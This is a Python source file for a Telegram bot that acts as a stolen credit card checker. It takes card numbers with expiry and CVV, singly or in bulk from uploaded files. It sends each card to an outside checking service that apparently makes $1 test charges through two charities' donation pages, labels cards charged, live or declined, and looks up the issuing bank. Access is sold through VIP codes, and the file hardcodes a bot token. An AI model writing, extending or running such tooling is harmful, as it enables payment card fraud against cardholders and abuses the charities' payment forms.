import os
import re
import time
import random
import string
import asyncio
import httpx
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes

TOKEN = '8610138136:AAHHtP1A21F3NdW6hcQHocpgkcd-GF2EE_U'

# ------------------- Users & Permissions -------------------
ADMINS = [6843321125]
VIP_USERS = {}  # {user_id: expiration_timestamp}
BANNED_USERS = {}  # {user_id: True}
stop_users = {}
last_check_time = {}
ANTI_SPAM_SECONDS = 7

# ------------------- Gates -------------------
GATES = [
    "https://raybensch.com/donations/support-ray/",
    "https://www.wfft.org/donations/general-donation/"
]
gate_index = 0
api_semaphore = asyncio.Semaphore(6)

# ------------------- Codes Example -------------------
CODES = {
    "WAFA-9387-IS96-8272": {"duration":7, "max_users":5, "used":0, "created":time.time()}
}

# ------------------- /code -------------------
async def code_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if len(context.args) == 0:
        return await update.message.reply_text("Usage:\n/code YOURCODEHERE")
    code = context.args[0].upper()
    if code not in CODES:
        return await update.message.reply_text("❌ Invalid code")
    code_data = CODES[code]
    if code_data["used"] >= code_data["max_users"]:
        return await update.message.reply_text("❌ Code usage limit reached")
    VIP_USERS[user_id] = int(time.time()) + code_data["duration"] * 24 * 3600
    code_data["used"] += 1
    await update.message.reply_text(
        f"✅ Code activated!\nYou are now VIP for {code_data['duration']} days.\nUsed {code_data['used']}/{code_data['max_users']}"
    )

# ------------------- /stop -------------------
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    stop_users[user_id] = True
    await update.message.reply_text("Stopped ⛔")

# ------------------- BIN Lookup -------------------
async def get_bin_info(bin_number):
    urls = [
        f"https://lookup.binlist.net/{bin_number}",
        f"https://bins.antipublic.cc/bins/{bin_number}",
        f"https://bincheck.io/api/{bin_number}"
    ]
    for _ in range(3):
        for url in urls:
            try:
                async with httpx.AsyncClient(timeout=10) as client:
                    r = await client.get(url)
                    if r.status_code != 200: continue
                    data = r.json()
                    brand = data.get("scheme") or data.get("brand") or data.get("type")
                    card_type = data.get("type") or data.get("card_type")
                    bank = data.get("bank", {}).get("name") if isinstance(data.get("bank"), dict) else data.get("bank")
                    country = data.get("country", {}).get("name") if isinstance(data.get("country"), dict) else data.get("country")
                    if not bank: bank = data.get("issuer") or data.get("bank_name")
                    if not country: country = data.get("country_name")
                    if brand or bank or country:
                        return (f"{brand or 'Unknown'} - {card_type or 'Unknown'}", bank or "Unknown", country or "Unknown")
            except: continue
        await asyncio.sleep(0.5)
    return "Unknown", "Unknown", "Unknown"

# ------------------- Check Card API -------------------
async def check_card_api(card_full):
    global gate_index
    gate = GATES[gate_index]
    gate_index = (gate_index + 1) % len(GATES)
    params = {"url": gate, "card": card_full, "amount": 1.00}
    async with api_semaphore:
        try:
            async with httpx.AsyncClient(timeout=20) as client:
                r = await client.get("http://gatescheck.duckdns.org:7000/check", params=params)
            result_raw = r.json().get('result', '')
            result = result_raw.lower()
            if "charge" in result or "success" in result:
                return "approved", result_raw
            elif "insufficient" in result:
                return "live", result_raw
            else:
                return "declined", result_raw
        except:
            return "declined", "Error"

# ------------------- Format Response -------------------
async def format_response(card_full, status, response, taken):
    bin_number = card_full.split("|")[0][:6]
    info, bank, country = await get_bin_info(bin_number)
    title = "#Charge ✅" if status=="approved" else "#Live 🟢" if status=="live" else "#Declined ❌"
    return f"""{title}

💳 Card: {card_full}
📨 Response: {response}

🏦 Info: {info}
🏛 Bank: {bank}
🌍 Country: {country}

⏱ Time: {taken}s
"""

# ------------------- Permissions -------------------
def can_user_check(user_id, mode="file"):
    if user_id in ADMINS: return True
    if user_id in VIP_USERS and time.time() < VIP_USERS[user_id]: return True
    return mode=="single"

# ------------------- Single Card -------------------
async def pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in BANNED_USERS: return await update.message.reply_text("❌ You are banned")
    if not can_user_check(user_id, "single"): return await update.message.reply_text("❌ Not allowed")
    if user_id not in ADMINS:
        last = last_check_time.get(user_id, 0)
        if time.time() - last < ANTI_SPAM_SECONDS:
            wait = round(ANTI_SPAM_SECONDS - (time.time() - last), 1)
            return await update.message.reply_text(f"⏳ Wait {wait}s before next check")
        last_check_time[user_id] = time.time()
    asyncio.create_task(process_pp(update, context))

async def process_pp(update, context):
    card_full = " ".join(context.args)
    if not card_full: return await update.message.reply_text("Usage:\n/pp 4242424242424242|09|28|123")
    start_time = time.time()
    status, response = await check_card_api(card_full)
    taken = round(time.time() - start_time, 2)
    text = await format_response(card_full, status, response, taken)
    await update.message.reply_text(text)

# ------------------- File Check -------------------
async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in BANNED_USERS: return await update.message.reply_text("❌ You are banned")
    if not can_user_check(user_id, "file"): return await update.message.reply_text("❌ Not allowed")
    asyncio.create_task(process_file(update, context))

async def process_file(update, context):
    user_id = update.effective_user.id
    stop_users[user_id] = False
    os.makedirs("downloads", exist_ok=True)
    file = await update.message.document.get_file()
    file_path = f"downloads/{file.file_id}.txt"
    await file.download_to_drive(file_path)

    approved = live = declined = 0
    panel_msg = await update.message.reply_text("Start Checking... 🔍")

    with open(file_path, 'r', encoding='utf-8') as f:
        lines = f.readlines()

    async def process_line(line):
        nonlocal approved, live, declined
        match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
        if not match: return
        card_full = match[0]
        start_time = time.time()
        status, response = await check_card_api(card_full)
        await asyncio.sleep(random.uniform(1, 5))
        taken = round(time.time() - start_time, 2)
        text = await format_response(card_full, status, response, taken)
        if status == "approved": approved += 1; await update.message.reply_text(text)
        elif status == "live": live += 1; await update.message.reply_text(text)
        else: declined += 1
        info, bank, country = await get_bin_info(card_full[:6])
        panel = f"""📊 Status

✅ Charge: {approved}
🟢 Live: {live}
❌ Declined: {declined}
📂 Total: {approved + live + declined}

━━━━━━━━━━━━━━━
💳 Last Card: {card_full}
📨 Response: {response}
🏦 Info: {info}
🏛 Bank: {bank}
🌍 Country: {country}
📌 Status: {status}
━━━━━━━━━━━━━━━

⛔ Stop: {'ON' if stop_users.get(user_id) else 'OFF'}
"""
        try: await panel_msg.edit_text(panel)
        except: pass

    for line in lines:
        if stop_users.get(user_id): break
        await process_line(line)

    await update.message.reply_text("Done ✅ File check completed")

# ------------------- Admin Panel -------------------
async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMINS: return await update.message.reply_text("❌ You are not an admin.")
    keyboard = []
    for uid in VIP_USERS.keys():
        keyboard.append([
            InlineKeyboardButton(f"{uid} - Ban", callback_data=f"ban_{uid}"),
            InlineKeyboardButton(f"{uid} - Unban", callback_data=f"unban_{uid}")
        ])
    keyboard.append([InlineKeyboardButton("Generate New Code", callback_data="gen_code")])
    keyboard.append([InlineKeyboardButton("Show Codes", callback_data="show_codes")])
    keyboard.append([InlineKeyboardButton("Show All Users", callback_data="show_users")])
    if not keyboard: keyboard = [[InlineKeyboardButton("No VIP users", callback_data="none")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("Admin Panel: Users & Codes", reply_markup=reply_markup)

async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    if user_id not in ADMINS: return await query.edit_message_text("❌ You are not an admin.")
    data = query.data
    if data.startswith("ban_"):
        uid = int(data.split("_")[1])
        VIP_USERS.pop(uid, None)
        BANNED_USERS[uid] = True
        await query.edit_message_text(f"User banned: {uid}")
    elif data.startswith("unban_"):
        uid = int(data.split("_")[1])
        VIP_USERS[uid] = int(time.time()) + 7*24*3600
        BANNED_USERS.pop(uid, None)
        await query.edit_message_text(f"User unbanned: {uid}")
    elif data == "gen_code":
        code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
        CODES[code] = {"duration":7, "max_users":5, "used":0, "created":time.time()}
        await query.edit_message_text(f"New code generated: {code}\nDuration: 7 days\nMax Users: 5")
    elif data == "show_codes":
        if not CODES: return await query.edit_message_text("No codes available")
        msg = "📜 Codes Overview:\n\n"
        for code, val in CODES.items():
            expiry = int(val["created"] + val["duration"]*24*3600 - time.time())
            days_left = max(expiry//86400,0)
            msg += f"Code: {code}\nUsed: {val['used']}/{val['max_users']}\nExpires in: {days_left} days\n\n"
        await query.edit_message_text(msg)
    elif data == "show_users":
        if not VIP_USERS and not BANNED_USERS:
            return await query.edit_message_text("No users yet")
        msg = "📊 All Users:\n\n"
        for uid in VIP_USERS:
            remaining = max(int((VIP_USERS[uid]-time.time())/3600),0)
            msg += f"VIP: {uid}, expires in {remaining} hours\n"
        for uid in BANNED_USERS:
            msg += f"BANNED: {uid}\n"
        await query.edit_message_text(msg)

# ------------------- Start -------------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Bot Ready ✅")

# ------------------- Run -------------------
def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("pp", pp))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("admin_panel", admin_panel))
    app.add_handler(CommandHandler("code", code_command))
    app.add_handler(CallbackQueryHandler(admin_callback))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.run_polling()

if __name__=="__main__":
    main()
